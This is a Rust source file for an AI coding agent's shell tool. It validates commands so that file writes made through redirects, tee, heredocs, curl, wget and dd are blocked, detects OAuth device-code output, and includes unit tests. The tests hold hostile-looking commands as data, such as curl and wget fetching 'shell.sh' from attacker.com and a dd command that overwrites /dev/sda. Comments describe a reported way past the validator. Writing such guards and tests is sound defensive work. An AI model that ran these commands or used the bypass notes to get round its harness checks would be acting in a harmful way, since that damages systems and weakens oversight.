use crate::tools::CrpMode;

const MAX_COMMAND_BYTES: usize = 8192;

/// Validates a shell command before execution. Returns Some(error_message) if
/// the command should be rejected, None if it's safe to run.
pub fn validate_command(command: &str) -> Option<String> {
    let write_allow_paths = crate::core::config::default_shell_write_allow_paths();
    let project_root = crate::core::config::Config::find_project_root();
    validate_command_with_write_allow_paths(command, &write_allow_paths, project_root.as_deref())
}

pub(crate) fn validate_command_with_write_allow_paths(
    command: &str,
    write_allow_paths: &[String],
    project_root: Option<&str>,
) -> Option<String> {
    if command.len() > MAX_COMMAND_BYTES {
        return Some(format!(
            "ERROR: Command too large ({} bytes, limit {}). \
             If you're writing file content, use the native Write/Edit tool instead. \
             ctx_shell is for reading command output only (git, cargo, npm, etc.).",
            command.len(),
            MAX_COMMAND_BYTES
        ));
    }

    // #931: strip heredoc bodies before the redirect scanner — a `>` inside a
    // heredoc body is opaque data, not a file-write redirect.
    let cmd_no_heredoc = crate::core::shell_allowlist::strip_all_heredoc_bodies(command);
    if has_file_write_redirect(&cmd_no_heredoc, write_allow_paths, project_root) {
        return Some(
            "ERROR: ctx_shell detected a file-write command (shell redirect > or >>). \
             Use the native Write tool to create/modify files. \
             ctx_shell is ONLY for reading command output (git status, cargo test, npm run, etc.). \
             File writes via shell cause MCP protocol corruption on large payloads. \
             Output capture to temp paths (/tmp, /var/tmp, $TMPDIR) is allowed."
                .to_string(),
        );
    }

    // #989: tee detection must run on heredoc-stripped text to avoid false
    // positives when the word "tee" appears in heredoc/quoted payloads.
    // `cmd | tee file` (piped) is output capture, not file authoring — the
    // primary output still goes to stdout for the agent. Only bare `tee file`
    // (not piped) is blocked as it is equivalent to `cat > file`.
    if has_disallowed_tee_target(&cmd_no_heredoc, write_allow_paths, project_root) {
        return Some(
            "ERROR: ctx_shell detected a file-write command (tee without pipe). \
             Use the native Write tool to create/modify files. \
             ctx_shell is ONLY for reading command output. \
             Piped tee (cmd | tee file) is allowed for output capture."
                .to_string(),
        );
    }

    if is_heredoc_file_write(command, write_allow_paths, project_root) {
        return Some(
            "ERROR: ctx_shell detected a heredoc writing to a file. \
             Use the native Write tool to create/modify files. \
             ctx_shell is ONLY for reading command output. \
             Note: heredocs for input piping (e.g. psql <<EOF) are allowed."
                .to_string(),
        );
    }

    if let Some(reason) = download_to_file_reason(command) {
        return Some(format!(
            "ERROR: ctx_shell detected a file download/write ({reason}). \
             ctx_shell is ONLY for reading command output — redirect-free flags bypass \
             this doctrine, so they are blocked too (GH #391). \
             Fetch to stdout instead (curl <url>, wget -qO- <url>) or use the editor's \
             native tools to create files."
        ));
    }

    None
}

/// Detects download/copy tools writing directly to files via their own flags
/// Returns true when a path targets a scratch/temp location outside the
/// project, where file downloads are safe (#1021).
fn is_scratch_path(path: &str) -> bool {
    let p = std::path::Path::new(path);
    if p.starts_with("/tmp")
        || p.starts_with("/var/tmp")
        || p.starts_with("/private/tmp")
        || p.starts_with("/dev/null")
    {
        return true;
    }
    if let Ok(tmpdir) = std::env::var("TMPDIR")
        && !tmpdir.is_empty()
        && p.starts_with(tmpdir.as_str())
    {
        return true;
    }
    false
}

/// (`curl -o`, `wget` default mode, `dd of=`) — the redirect-free equivalent of
/// `> file`, reported as a `validate_command` bypass in GH #391.
fn download_to_file_reason(command: &str) -> Option<String> {
    for seg in crate::core::shell_allowlist::extract_all_commands_pub(command) {
        let tokens = crate::core::shell_allowlist::shell_tokenize(seg.trim());
        let Some(first) = tokens.first() else {
            continue;
        };
        let base = first.rsplit('/').next().unwrap_or(first);
        match base {
            "curl" => {
                let tokens_slice = &tokens[1..];
                for (i, tok) in tokens_slice.iter().enumerate() {
                    let target: Option<&str> = if tok == "--output" {
                        tokens_slice.get(i + 1).map(String::as_str)
                    } else if let Some(val) = tok.strip_prefix("--output=") {
                        Some(val)
                    } else if tok == "--output-dir" {
                        tokens_slice.get(i + 1).map(String::as_str)
                    } else if let Some(val) = tok.strip_prefix("--output-dir=") {
                        Some(val)
                    } else if tok.starts_with('-')
                        && !tok.starts_with("--")
                        && tok[1..].contains('o')
                    {
                        // -o <file>: next token is the path
                        tokens_slice.get(i + 1).map(String::as_str)
                    } else if tok == "--remote-name"
                        || tok == "--remote-name-all"
                        || (tok.starts_with('-')
                            && !tok.starts_with("--")
                            && tok[1..].contains('O'))
                    {
                        Some(".")
                    } else {
                        None
                    };
                    if let Some(path) = target {
                        if is_scratch_path(path) {
                            continue;
                        }
                        return Some(format!("curl {tok}"));
                    }
                }
            }
            "wget" => {
                // wget writes a file BY DEFAULT; only stdout/no-download modes pass.
                let to_stdout = tokens[1..].iter().enumerate().any(|(i, tok)| {
                    tok == "--output-document=-"
                        || tok == "-O-"
                        || (tok.starts_with('-') && !tok.starts_with("--") && tok.ends_with("O-"))
                        || ((tok == "-O" || tok == "--output-document")
                            && tokens.get(i + 2).map(std::string::String::as_str) == Some("-"))
                        || tok == "--spider"
                });
                if !to_stdout {
                    return Some(
                        "wget downloads to a file by default; use wget -qO- <url> for stdout"
                            .to_string(),
                    );
                }
            }
            "dd" => {
                for tok in &tokens[1..] {
                    if tok.starts_with("of=") && !tok.starts_with("of=/dev/null") {
                        return Some(format!("dd {tok}"));
                    }
                }
            }
            _ => {}
        }
    }
    None
}

/// Returns true only for heredocs that redirect to files (the dangerous pattern).
/// Legitimate heredoc uses (input piping, inline scripts) are allowed through.
fn is_heredoc_file_write(
    command: &str,
    write_allow_paths: &[String],
    project_root: Option<&str>,
) -> bool {
    let has_heredoc = command.contains("<<");
    if !has_heredoc {
        return false;
    }
    let cmd_lower = command.to_lowercase();
    let heredoc_patterns = ["<<eof", "<<'eof'", "<<\"eof\"", "<<end", "<<'end'"];
    let has_known_heredoc = heredoc_patterns.iter().any(|p| cmd_lower.contains(p));
    if !has_known_heredoc {
        return false;
    }
    // #931: strip heredoc bodies so `>` / `>>` inside the body are not
    // mistaken for file-write redirects.
    let stripped = crate::core::shell_allowlist::strip_all_heredoc_bodies(command);
    has_file_write_redirect(&stripped, write_allow_paths, project_root)
}

/// Detects shell redirect operators (`>` or `>>`) that write to files.
/// Ignores `>` inside quotes, after a backslash escape (`\"` must not toggle
/// quote state, `\>` is a literal), `2>` (stderr), `/dev/null`, and
/// comparison operators.
/// #848: temp directory targets are read-back, not persistent writes.
/// #848/#989: targets that are NOT persistent project-file writes.
/// Redirecting to temp dirs, /dev/* devices, or paths containing shell
/// variables (which we cannot resolve at parse time) is output capture,
/// not file authoring.
pub fn is_temp_redirect_target(target: &str) -> bool {
    let write_allow_paths = crate::core::config::default_shell_write_allow_paths();
    is_write_allowed_redirect_target(target, &write_allow_paths, None)
}

fn is_write_allowed_redirect_target(
    target: &str,
    write_allow_paths: &[String],
    project_root: Option<&str>,
) -> bool {
    // `>|` is the noclobber-override form of `>`; the `|` is not part of the path.
    let t = target.trim_start_matches(['>', '&', '|']);
    // #1142: agents quote scratch paths (`> "$TMPDIR/x.log"`, `> "/private/tmp/x"`);
    // strip quotes so quoted and unquoted targets are judged identically.
    let t = t.trim_matches(['"', '\'']);
    if t.starts_with('$') || t.starts_with("${") {
        // Preserve #989's escape hatch for harness-provided scratch paths.
        return true;
    }

    let path = std::path::Path::new(t);
    if !path.is_absolute() {
        return false;
    }
    let resolved = resolve_path_for_comparison(path);
    if project_root.is_some_and(|root| {
        resolved.starts_with(resolve_path_for_comparison(std::path::Path::new(root)))
    }) {
        return false;
    }
    write_allow_paths.iter().any(|allowed| {
        resolved.starts_with(resolve_path_for_comparison(std::path::Path::new(allowed)))
    })
}

fn resolve_path_for_comparison(path: &std::path::Path) -> std::path::PathBuf {
    use std::path::{Component, PathBuf};

    let mut normalized = PathBuf::new();
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                normalized.pop();
            }
            other => normalized.push(other.as_os_str()),
        }
    }

    let mut unresolved = Vec::new();
    let mut existing = normalized.clone();
    while !existing.exists() {
        let Some(name) = existing.file_name() else {
            break;
        };
        unresolved.push(name.to_os_string());
        if !existing.pop() {
            break;
        }
    }
    let mut resolved = crate::core::pathutil::canonicalize_secure_or_self(&existing);
    for component in unresolved.iter().rev() {
        resolved.push(component);
    }
    resolved
}

fn tee_targets(command: &str) -> Vec<String> {
    crate::core::shell_allowlist::extract_all_commands_pub(command)
        .into_iter()
        .filter_map(|segment| {
            let tokens = crate::core::shell_allowlist::shell_tokenize(segment.trim());
            let first = tokens.first()?;
            if first.rsplit('/').next().unwrap_or(first) != "tee" {
                return None;
            }
            let mut after_separator = false;
            Some(
                tokens
                    .iter()
                    .skip(1)
                    .find(|token| {
                        if *token == "--" {
                            after_separator = true;
                            return false;
                        }
                        after_separator || !token.starts_with('-')
                    })
                    .cloned()
                    .unwrap_or_default(),
            )
        })
        .collect()
}

fn has_disallowed_tee_target(
    command: &str,
    write_allow_paths: &[String],
    project_root: Option<&str>,
) -> bool {
    tee_targets(command).into_iter().any(|target| {
        !target.is_empty()
            && !is_write_allowed_redirect_target(&target, write_allow_paths, project_root)
    })
}

fn has_file_write_redirect(
    command: &str,
    write_allow_paths: &[String],
    project_root: Option<&str>,
) -> bool {
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while i < len {
        let c = bytes[i];
        if c == b'\\' && !in_single_quote {
            // A backslash escapes the next byte (POSIX: outside quotes and
            // inside double quotes; inside single quotes it is literal).
            // Without this, an escaped quote like `\"` toggled the quote
            // state and literal `>` in quoted prose (e.g. `(root: <root>)`
            // in a gh --body string) read as a redirect (#903).
            i += 2;
            continue;
        }
        if c == b'\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
        } else if c == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
        } else if c == b'>' && !in_single_quote && !in_double_quote {
            if i > 0 && bytes[i - 1] == b'2' {
                i += 1;
                continue;
            }
            let target_start = if i + 1 < len && bytes[i + 1] == b'>' {
                i + 2
            } else {
                i + 1
            };
            let target: String = command[target_start..]
                .trim_start()
                .chars()
                .take_while(|c| !c.is_whitespace())
                .collect();
            if target == "/dev/null" || target == "/dev/stdout" || target == "/dev/stderr" {
                i += 1;
                continue;
            }
            // #1142: `>&1` / `>&2` duplicate a file descriptor — no file involved.
            // (`2>&1` is already skipped by the `2>` case above.)
            if let Some(fd) = target.strip_prefix('&')
                && !fd.is_empty()
                && (fd == "-" || fd.chars().all(|c| c.is_ascii_digit()))
            {
                i += 1;
                continue;
            }
            // #848: allow redirects to temp directories — agents capture
            // build output for grepping, not writing persistent files.
            if is_write_allowed_redirect_target(&target, write_allow_paths, project_root) {
                i += 1;
                continue;
            }
            if !target.is_empty() {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// On Windows cmd.exe, `;` is not a valid command separator.
/// Convert `cmd1; cmd2` to `cmd1 && cmd2` when running under cmd.exe.
pub fn normalize_command_for_shell(command: &str) -> String {
    if !cfg!(windows) {
        return command.to_string();
    }
    let (_, flag) = crate::shell::shell_and_flag();
    if flag != "/C" {
        return command.to_string();
    }
    let bytes = command.as_bytes();
    let mut result = Vec::with_capacity(bytes.len() + 16);
    let mut in_single = false;
    let mut in_double = false;
    for (i, &b) in bytes.iter().enumerate() {
        if b == b'\'' && !in_double {
            in_single = !in_single;
        } else if b == b'"' && !in_single {
            in_double = !in_double;
        } else if b == b';' && !in_single && !in_double {
            result.extend_from_slice(b" && ");
            continue;
        }
        result.push(b);
        let _ = i;
    }
    String::from_utf8(result).unwrap_or_else(|_| command.to_string())
}

/// Compresses shell command output using the unified compression pipeline.
/// Delegates to the same exit-code-aware logic used by the CLI, so a failed
/// command (`exit_code != 0`) is preserved verbatim and successful output is
/// compressed consistently (excluded_commands, structural routing, terse). #810.
pub fn handle(command: &str, output: &str, exit_code: i32, _crp_mode: CrpMode) -> String {
    crate::shell::compress::engine::compress_for_outcome(command, output, exit_code)
}

pub fn handle_with_context(
    command: &str,
    output: &str,
    exit_code: i32,
    crp_mode: CrpMode,
    project_root: Option<&str>,
) -> String {
    let mut result = handle(command, output, exit_code, crp_mode);

    {
        if let Some(root) = project_root {
            let estimated_tokens = result.len() / 4;
            if estimated_tokens > 500 {
                let kernel_budget = 100;
                if let Some(enrichment) =
                    crate::core::context_kernel::bridge::kernel_enrich(command, root, kernel_budget)
                    && !enrichment.blocks.is_empty()
                {
                    result.push_str("\n--- kernel context ---\n");
                    result.push_str(&enrichment.blocks);
                }
            }
        }
    }

    result
}

#[cfg(test)]
mod kernel_tests {
    use super::handle_with_context;
    use crate::tools::CrpMode;

    #[test]
    fn handle_with_context_does_not_panic_on_short_output() {
        let result = handle_with_context("ls", "file.txt", 0, CrpMode::Tdd, Some("/tmp"));
        assert!(!result.is_empty());
    }
}

#[cfg(test)]
fn is_search_command(command: &str) -> bool {
    let cmd = command.trim_start();
    cmd.starts_with("grep ")
        || cmd.starts_with("rg ")
        || cmd.starts_with("find ")
        || cmd.starts_with("fd ")
        || cmd.starts_with("ag ")
        || cmd.starts_with("ack ")
}

#[cfg(test)]
fn generic_compress(output: &str) -> String {
    let output = crate::core::compressor::strip_ansi(output);
    let lines: Vec<&str> = output
        .lines()
        .filter(|l| {
            let t = l.trim();
            !t.is_empty()
        })
        .collect();

    if lines.len() <= 20 {
        return lines.join("\n");
    }

    let show_count = (lines.len() / 3).min(30);
    let half = show_count / 2;
    let first = &lines[..half];
    let last = &lines[lines.len() - half..];
    let omitted = lines.len() - (half * 2);
    format!(
        "{}\n[truncated: showing {}/{} lines, {} omitted. Use raw=true for full output.]\n{}",
        first.join("\n"),
        half * 2,
        lines.len(),
        omitted,
        last.join("\n")
    )
}

/// Detects OAuth device code flow output that must not be compressed.
/// Uses a two-tier approach: strong signals match alone (very specific to
/// device code flows), weak signals require a URL/domain in the same output.
pub fn contains_auth_flow(output: &str) -> bool {
    let lower = output.to_lowercase();

    const STRONG_SIGNALS: &[&str] = &[
        "devicelogin",
        "deviceauth",
        "device_code",
        "device code",
        "device-code",
        "verification_uri",
        "user_code",
        "one-time code",
    ];

    if STRONG_SIGNALS.iter().any(|s| lower.contains(s)) {
        return true;
    }

    const WEAK_SIGNALS: &[&str] = &[
        "enter the code",
        "enter this code",
        "enter code:",
        "use the code",
        "use a web browser to open",
        "open the page",
        "authenticate by visiting",
        "sign in with the code",
        "sign in using a code",
        "verification code",
        "authorize this device",
        "waiting for authentication",
        "waiting for login",
        "waiting for you to authenticate",
        "open your browser",
        "open in your browser",
    ];

    let has_weak_signal = WEAK_SIGNALS.iter().any(|s| lower.contains(s));
    if !has_weak_signal {
        return false;
    }

    lower.contains("http://") || lower.contains("https://")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normalize_cmd_no_change_on_unix() {
        if cfg!(windows) {
            return;
        }
        assert_eq!(
            normalize_command_for_shell("cd /tmp; ls -la"),
            "cd /tmp; ls -la"
        );
    }

    #[test]
    fn validate_allows_safe_commands() {
        assert!(validate_command("git status").is_none());
        assert!(validate_command("cargo test").is_none());
        assert!(validate_command("npm run build").is_none());
        assert!(validate_command("ls -la").is_none());
    }

    #[test]
    fn validate_blocks_file_writes() {
        assert!(validate_command("echo 'data' > output.txt").is_some());
        assert!(validate_command("tee output.txt").is_some());
        assert!(validate_command("printf 'hello' > test.txt").is_some());
    }

    #[test]
    #[cfg(unix)]
    fn validate_allows_literal_temp_redirect_and_tee_targets() {
        let paths = crate::core::config::default_shell_write_allow_paths();
        assert!(
            validate_command_with_write_allow_paths(
                "go test ./... > /private/tmp/agent-test.log 2>&1",
                &paths,
                None
            )
            .is_none()
        );
        assert!(
            validate_command_with_write_allow_paths(
                "tee /private/tmp/agent-test.log",
                &paths,
                None
            )
            .is_none()
        );
        assert!(
            validate_command_with_write_allow_paths(
                "go test ./... | tee /private/tmp/agent-test.log",
                &paths,
                None
            )
            .is_none()
        );
    }

    #[test]
    fn validate_blocks_redirects_and_piped_tee_into_project_root() {
        let root = std::env::current_dir().expect("test cwd");
        let target = root.join("agent-test.log");
        let target = target.to_string_lossy();
        let paths = crate::core::config::default_shell_write_allow_paths();
        assert!(
            validate_command_with_write_allow_paths(
                &format!("echo output > {target}"),
                &paths,
                Some(root.to_string_lossy().as_ref())
            )
            .is_some()
        );
        assert!(
            validate_command_with_write_allow_paths(
                &format!("go test | tee {target}"),
                &paths,
                Some(root.to_string_lossy().as_ref())
            )
            .is_some()
        );
    }

    #[test]
    #[cfg(unix)]
    fn validate_allows_configured_external_write_path() {
        let paths = vec!["/var/agent-scratch".to_string()];
        assert!(
            validate_command_with_write_allow_paths(
                "go test ./... >> /var/agent-scratch/gotest.log",
                &paths,
                Some("/workspace/project")
            )
            .is_none()
        );
        assert!(
            validate_command_with_write_allow_paths(
                "go test ./... | tee /var/agent-scratch/gotest.log",
                &paths,
                Some("/workspace/project")
            )
            .is_none()
        );
        assert!(
            validate_command_with_write_allow_paths(
                "echo output > /var/other/gotest.log",
                &paths,
                Some("/workspace/project")
            )
            .is_some()
        );
    }

    #[test]
    fn validate_blocks_heredoc_with_file_redirect() {
        assert!(validate_command("cat > file.py <<'EOF'\nprint('hi')\nEOF").is_some());
        assert!(validate_command("cat <<EOF > output.txt\nhello\nEOF").is_some());
        assert!(validate_command("cat <<'END' >> logfile.txt\ndata\nEND").is_some());
    }

    #[test]
    fn validate_allows_heredoc_without_file_redirect() {
        assert!(validate_command("cat <<EOF\nhello world\nEOF").is_none());
        assert!(validate_command("psql -d mydb <<EOF\nSELECT 1;\nEOF").is_none());
        assert!(
            validate_command("git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"").is_none()
        );
        assert!(validate_command("grep pattern <<EOF\nfoo\nbar\nEOF").is_none());
    }

    #[test]
    fn validate_blocks_oversized_commands() {
        let huge = "x".repeat(MAX_COMMAND_BYTES + 1);
        let result = validate_command(&huge);
        assert!(result.is_some());
        assert!(result.unwrap().contains("too large"));
    }

    #[test]
    fn validate_allows_cat_without_redirect() {
        assert!(validate_command("cat file.txt").is_none());
    }

    // --- GH #903: literal `>` in quoted prose is not a redirect ---

    #[test]
    fn validate_allows_escaped_quotes_with_angle_brackets() {
        // `\"` inside a double-quoted string must not toggle quote state;
        // the `>` in `<root>` is quoted data, not a redirect.
        assert!(
            validate_command(
                "gh issue comment 1 --body \"$(printf 'says \\\"root: <root>\\\" only')\""
            )
            .is_none()
        );
        assert!(validate_command("echo \"say \\\">hi<\\\" ok\"").is_none());
        // escaped `>` outside quotes is a literal, not a redirect
        assert!(validate_command("echo a \\> b").is_none());
    }

    #[test]
    fn validate_still_blocks_redirect_after_escapes() {
        // the escape handling must not hide a real redirect later on
        assert!(validate_command("echo \"a \\\"b\\\"\" > out.txt").is_some());
        assert!(validate_command("echo \\\\ > out.txt").is_some());
    }

    // --- GH #897: heredoc-to-stdin and /dev/null redirects are not file writes ---

    #[test]
    fn heredoc_stdin_without_redirect_is_allowed() {
        assert!(validate_command("git commit -F - <<'EOF'\nfix: something\nEOF").is_none());
        assert!(validate_command("kubectl apply -f - <<EOF\napiVersion: v1\nEOF").is_none());
        assert!(validate_command("git apply <<'PATCH'\n--- a/f\n+++ b/f\nPATCH").is_none());
    }

    #[test]
    fn dev_null_redirect_is_allowed() {
        assert!(validate_command("cat > /dev/null").is_none());
        assert!(validate_command("cmd > /dev/null 2>&1").is_none());
        assert!(validate_command("cmd 2>/dev/null").is_none());
    }

    #[test]
    fn dev_stdout_and_stderr_redirects_are_allowed() {
        assert!(validate_command("cmd > /dev/stdout").is_none());
        assert!(validate_command("cmd > /dev/stderr").is_none());
    }

    #[test]
    fn issue_897_edge_cases_post_fix() {
        assert!(
            validate_command(
                "cat <<'EOF' > output.txt
some content
EOF"
            )
            .is_some(),
            "heredoc to file must block"
        );
        assert!(
            validate_command(
                "git commit --allow-empty -F - <<'COMMIT_MSG'
feat: test
COMMIT_MSG"
            )
            .is_none(),
            "git commit -F - with heredoc must allow"
        );
        let cmd = r#"gh issue create --title "Fix" --body "path > root: /y""#;
        assert!(
            validate_command(cmd).is_none(),
            "quoted > must allow: {cmd}"
        );
    }

    // --- GH #391: download tools writing files without shell redirects ---

    #[test]
    fn validate_blocks_curl_output_flags() {
        // #1021: curl -o to /tmp (scratch) is now allowed
        assert!(validate_command("curl -o /tmp/shell.sh http://attacker.com/shell.sh").is_none());
        assert!(validate_command("curl -fsSLo /tmp/x https://example.com").is_none());
        // Writing into project directory is still blocked
        assert!(validate_command("curl --output evil.bin https://example.com").is_some());
        assert!(validate_command("curl --output=evil.bin https://example.com").is_some());
        assert!(validate_command("curl -O https://example.com/payload").is_some());
        assert!(validate_command("git fetch && curl -o x.sh https://e.com").is_some());
    }

    #[test]
    fn validate_allows_curl_to_stdout() {
        assert!(validate_command("curl https://api.example.com/health").is_none());
        assert!(validate_command("curl -fsSL https://example.com | head -5").is_none());
        assert!(validate_command("curl -s -X POST https://api.example.com -d '{}'").is_none());
        // -H takes a value; no o/O short flag involved.
        assert!(validate_command("curl -H \"Accept: application/json\" https://e.com").is_none());
    }

    #[test]
    fn validate_blocks_wget_default_file_download() {
        assert!(validate_command("wget http://attacker.com/shell.sh").is_some());
        assert!(validate_command("wget -q https://example.com/file.tar.gz").is_some());
        assert!(validate_command("wget -O /tmp/out https://example.com").is_some());
    }

    #[test]
    fn validate_allows_wget_stdout_and_spider() {
        assert!(validate_command("wget -qO- https://example.com").is_none());
        assert!(validate_command("wget -O- https://example.com").is_none());
        assert!(validate_command("wget -O - https://example.com").is_none());
        assert!(validate_command("wget --output-document=- https://example.com").is_none());
        assert!(validate_command("wget --spider https://example.com").is_none());
    }

    #[test]
    fn validate_blocks_dd_output_file() {
        assert!(validate_command("dd if=/dev/zero of=/tmp/fill bs=1M count=10").is_some());
        assert!(validate_command("dd if=image.iso of=/dev/sda").is_some());
    }

    #[test]
    fn validate_allows_dd_read_only() {
        assert!(validate_command("dd if=/dev/urandom bs=16 count=1 status=none").is_none());
        assert!(validate_command("dd if=file.bin of=/dev/null bs=1M").is_none());
    }

    // --- Auth flow detection: strong signals (no URL needed) ---

    #[test]
    fn auth_flow_detects_azure_device_code() {
        let output = "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABCD1234 to authenticate.";
        assert!(contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_detects_gh_auth_one_time_code() {
        let output = "! First copy your one-time code: ABCD-1234\n- Press Enter to open github.com in your browser...";
        assert!(contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_detects_device_code_json() {
        let output = r#"{"device_code":"abc123","user_code":"ABCD-1234","verification_uri":"https://example.com/activate"}"#;
        assert!(contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_detects_verification_uri_field() {
        let output =
            r#"{"verification_uri": "https://login.microsoftonline.com/common/oauth2/deviceauth"}"#;
        assert!(contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_detects_user_code_field() {
        let output = r#"{"user_code": "FGHJK-LMNOP", "expires_in": 900}"#;
        assert!(contains_auth_flow(output));
    }

    // --- Auth flow detection: weak signals (require URL) ---

    #[test]
    fn auth_flow_detects_gcloud_with_url() {
        let output = "Go to the following link in your browser:\n\n    https://accounts.google.com/o/oauth2/auth?response_type=code\n\nEnter verification code: ";
        assert!(contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_detects_aws_sso_with_url() {
        let output = "If the browser does not open, open the following URL:\nhttps://device.sso.us-east-1.amazonaws.com/\n\nThen enter the code:\nABCD-EFGH";
        assert!(contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_detects_firebase_with_url() {
        let output = "Visit this URL on this device to log in:\nhttps://accounts.google.com/o/oauth2/auth?...\n\nWaiting for authentication...";
        assert!(contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_detects_generic_browser_open_with_url() {
        let output =
            "Open your browser to https://login.example.com/device and enter the code XYZW-1234";
        assert!(contains_auth_flow(output));
    }

    // --- False positive protection ---

    #[test]
    fn auth_flow_ignores_normal_build_output() {
        let output = "Compiling lean-ctx v2.21.9\nFinished release profile\n";
        assert!(!contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_ignores_git_output() {
        let output = "On branch main\nYour branch is up to date with 'origin/main'.\nnothing to commit, working tree clean";
        assert!(!contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_ignores_npm_install_output() {
        let output = "added 150 packages in 3s\n\n24 packages are looking for funding\n  run `npm fund` for details\nhttps://npmjs.com/package/lean-ctx";
        assert!(!contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_ignores_docs_mentioning_auth() {
        let output = "The authorization code grant type is the most common OAuth flow.\nSee https://oauth.net/2/grant-types/ for details.";
        assert!(!contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_weak_signal_requires_url() {
        let output = "Please enter the code ABC123 in the terminal";
        assert!(!contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_weak_signal_without_url_is_ignored() {
        let output = "Waiting for authentication to complete... done!";
        assert!(!contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_ignores_virtualenv_activate() {
        let output = "Created virtualenv at .venv\nRun: source .venv/bin/activate";
        assert!(!contains_auth_flow(output));
    }

    #[test]
    fn auth_flow_ignores_api_response_with_code_field() {
        let output = r#"{"status": "ok", "code": 200, "message": "success"}"#;
        assert!(!contains_auth_flow(output));
    }

    // --- Integration: handle() preserves auth flow ---

    #[test]
    fn handle_preserves_auth_flow_output_fully() {
        let output = "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABCD1234 to authenticate.\nWaiting for you...\nLine 3\nLine 4\nLine 5\nLine 6\nLine 7\nLine 8\nLine 9\nLine 10\nLine 11\nLine 12\nLine 13";
        // az login is Passthrough via OutputPolicy, so all content is preserved
        let result = handle("az login --use-device-code", output, 0, CrpMode::Off);
        assert!(result.contains("ABCD1234"), "auth code must be preserved");
        assert!(result.contains("devicelogin"), "URL must be preserved");
        assert!(
            result.contains("Line 13"),
            "all lines must be preserved (no truncation)"
        );
    }

    #[test]
    fn handle_compresses_normal_output_not_auth() {
        let lines: Vec<String> = (1..=20).map(|i| format!("Line {i} of output")).collect();
        let output = lines.join("\n");
        let result = handle("some-tool check", &output, 0, CrpMode::Off);
        assert!(
            !result.contains("auth/device-code flow detected"),
            "normal output must not trigger auth detection"
        );
        assert!(
            result.len() < output.len() + 100,
            "normal output should be compressed, not inflated"
        );
    }

    #[test]
    fn is_search_command_detects_grep() {
        assert!(is_search_command("grep -r pattern src/"));
        assert!(is_search_command("rg pattern src/"));
        assert!(is_search_command("find . -name '*.rs'"));
        assert!(is_search_command("fd pattern"));
        assert!(is_search_command("ag pattern src/"));
        assert!(is_search_command("ack pattern"));
    }

    #[test]
    fn is_search_command_rejects_non_search() {
        assert!(!is_search_command("cargo build"));
        assert!(!is_search_command("git status"));
        assert!(!is_search_command("npm install"));
        assert!(!is_search_command("cat file.rs"));
    }

    #[test]
    fn generic_compress_preserves_short_output() {
        let lines: Vec<String> = (1..=20).map(|i| format!("Line {i}")).collect();
        let output = lines.join("\n");
        let result = generic_compress(&output);
        assert_eq!(result, output);
    }

    #[test]
    fn generic_compress_scales_with_length() {
        let lines: Vec<String> = (1..=60).map(|i| format!("Line {i}")).collect();
        let output = lines.join("\n");
        let result = generic_compress(&output);
        assert!(result.contains("truncated"));
        let shown_count = result.lines().count();
        assert!(
            shown_count > 10,
            "should show more than old 6-line limit, got {shown_count}"
        );
        assert!(shown_count < 60, "should be truncated, not full output");
    }

    #[test]
    fn handle_preserves_search_results() {
        let lines: Vec<String> = (1..=30)
            .map(|i| format!("src/file{i}.rs:42: fn search_result()"))
            .collect();
        let output = lines.join("\n");
        let result = handle("rg search_result src/", &output, 0, CrpMode::Off);
        for i in 1..=30 {
            assert!(
                result.contains(&format!("file{i}")),
                "search result file{i} should be preserved in output"
            );
        }
    }

    // --- GH #931: unquoted heredoc body > must not trip redirect scanner ---

    #[test]
    fn unquoted_heredoc_gt_in_body_not_blocked() {
        let cmd = "psql <<SQL\nSELECT * FROM t WHERE x > 0;\nSQL";
        assert!(
            validate_command(cmd).is_none(),
            "unquoted heredoc body with > must not be flagged as redirect"
        );
    }

    #[test]
    fn unquoted_heredoc_append_in_body_not_blocked() {
        let cmd = "cat <<END\nline with >> inside\nEND";
        assert!(
            validate_command(cmd).is_none(),
            "unquoted heredoc body with >> must not be flagged"
        );
    }

    // --- GH #1142: literal scratch paths outside project root ---

    // The literal scratch roots (/tmp, /private/tmp, /var/tmp) are only in
    // `default_shell_write_allow_paths()` on Unix, so path-shaped assertions
    // are Unix-only; the `$VAR` escape hatch is cross-platform.
    #[test]
    #[cfg(unix)]
    fn issue_1142_private_tmp_redirect_allowed() {
        // exact repro from the issue: capture test log under /private/tmp scratchpad
        assert!(
            validate_command(
                "go test ./... > /private/tmp/claude-502/scratchpad/gotest.log 2>&1; echo EXIT:$?"
            )
            .is_none()
        );
        assert!(validate_command("cargo test > /var/tmp/out.log 2>&1").is_none());
        assert!(validate_command("make 2>> /private/tmp/err.log").is_none());
        // quoted targets must be judged like unquoted ones
        assert!(validate_command("cargo test > \"/private/tmp/x/build.log\"").is_none());
    }

    #[test]
    fn issue_1142_quoted_scratch_target_allowed() {
        // quoted targets must be judged like unquoted ones
        assert!(validate_command("cargo test > \"$TMPDIR/build.log\"").is_none());
        assert!(validate_command("cargo test > '$SCRATCH/build.log'").is_none());
    }

    #[test]
    fn issue_1142_fd_dup_allowed() {
        assert!(validate_command("echo error >&2").is_none());
        assert!(validate_command("printf 'x' 1>&2 && git status").is_none());
    }

    #[test]
    fn issue_1142_project_writes_still_blocked() {
        assert!(validate_command("cargo test > build.log").is_some());
        assert!(validate_command("echo x > /Users/me/project/out.txt").is_some());
        assert!(validate_command("echo x > \"./out.txt\"").is_some());
